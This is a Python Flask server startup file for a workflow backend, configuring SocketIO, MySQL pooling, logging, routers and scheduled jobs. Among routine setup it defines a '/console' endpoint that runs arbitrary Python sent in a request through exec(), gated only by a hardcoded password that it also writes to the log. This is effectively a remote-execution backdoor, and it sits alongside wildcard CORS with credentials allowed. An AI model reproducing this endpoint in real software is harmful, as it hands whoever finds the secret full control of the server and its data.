# builtin
import logging

# 3rd ext
from flask import Flask, request
from flask_migrate import Migrate
from flask_socketio import SocketIO

# int
import config
from exts import db
from actions import cronAction
import g
from managers import timeMgr


# region init
app = Flask(__name__)
g.app = app

# Initialize SocketIO with gevent async_mode for compatibility with gevent WSGIServer
socketio = SocketIO(
    app,
    cors_allowed_origins="*",
    async_mode="gevent",
    logger=False,
    engineio_logger=False,
)
g.socketio = socketio

logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s in %(module)s: %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

# 添加文件处理器，将日志写入 work_flow_server.log
file_handler = logging.FileHandler('log/work_flow_server.log')
file_handler.setLevel(logging.INFO)
file_handler.setFormatter(logging.Formatter('[%(asctime)s] %(levelname)s in %(module)s: %(message)s'))
app.logger.addHandler(file_handler)
app.logger.setLevel(logging.INFO)

# 需要设置为utf8mb4而不是utf8，这样可以支持emoji表情
app.config['SQLALCHEMY_DATABASE_URI'] = f"mysql+pymysql://{config.USERNAME}:{config.PASSWORD}@{config.HOSTNAME}:{config.PORT}/{config.DATABASE}?charset=utf8mb4"  # noqa
# 连接池配置
app.config['SQLALCHEMY_ENGINE_OPTIONS'] = {
    'pool_size': 70,          # 池中可持有的最大连接数
    'max_overflow': 30,      # 池中临时连接的最大数量
}
# app.config['SQLALCHEMY_BINDS'] = {
#     'map_db': f"mysql+pymysql://{config.USERNAME}:{config.PASSWORD}@{config.HOSTNAME}:{config.PORT}/{config.DATABASE_HEATMAP}?charset=utf8mb4"  # noqa
# }

db.init_app(app)
migrate = Migrate(app, db)

cronAction.setApp(app)

# 首次创建表，简单粗暴搞下
# with app.app_context():
#     db.create_all()

# 测试连接是否成功
# with app.app_context():
#     with db.engine.connect() as conn:
#         s = sqlalchemy.text("select 1")
#         re = conn.execute(s)
#         print(re.fetchone())


@app.after_request
def apply_caching(response):
    # 因为前端是另一个端口，访问flask后台的是跨域访问，所以在所有response中增加cors配置，允许跨域
    response.headers.add("Access-Control-Allow-Origin", "*")
    response.headers.add("Access-Control-Allow-Credentials", "true")
    response.headers.add("Access-Control-Allow-Methods", "GET,HEAD,OPTIONS,POST,PUT,DELETE")
    response.headers.add("Access-Control-Allow-Headers", "*")
    return response

# endregion


# region route
@app.route('/home', methods=['GET', 'POST'])
def home():
    app.logger.info("flask home")
    return '<h1>Home</h1>'


@app.route('/console', methods=['POST'])
def console():
    data = request.get_json()
    pwd = data.get('__pwd__')
    cmd = data.get('__command__')
    app.logger.info(f"console {pwd} {cmd}")
    if pwd != "#bT4x@rL28Y":
        return '<h1>Secret</h1>'
    exec(cmd)
    return '<h1>Command Exec Success</h1>'
# end region


# region run

# for debug
if app.debug:
    logging.info("in debug mode")


def init_routers():
    import importlib
    for routerName in config.routerList:
        logging.info(f"add route: {routerName}")
        importlib.import_module(f"routers.{routerName}")


def init_cron():
    from actions import cronAction
    from managers import timeMgr
    timeMgr.TimeMgr.initServerSchedule(cronAction.serverCronList)

def init_kdip():
    from Implement.kdipServerImpl.kdipServerImp import KdipServer
    KdipServer.init_schedule()


init_routers()
init_kdip()
init_cron()